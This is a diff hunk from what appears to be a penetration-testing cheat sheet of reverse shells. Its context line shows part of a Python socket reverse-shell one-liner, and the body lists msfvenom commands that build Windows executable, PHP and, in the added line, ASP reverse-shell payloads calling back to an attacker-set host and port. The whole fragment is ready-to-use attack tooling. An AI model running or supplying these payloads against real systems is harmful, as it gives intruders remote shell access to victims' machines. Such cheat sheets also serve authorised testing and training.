@@ -19,6 +19,7 @@ python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOC
 #### Msfvenom Reverse Shells
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o shell.asp
 msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
 ```
 
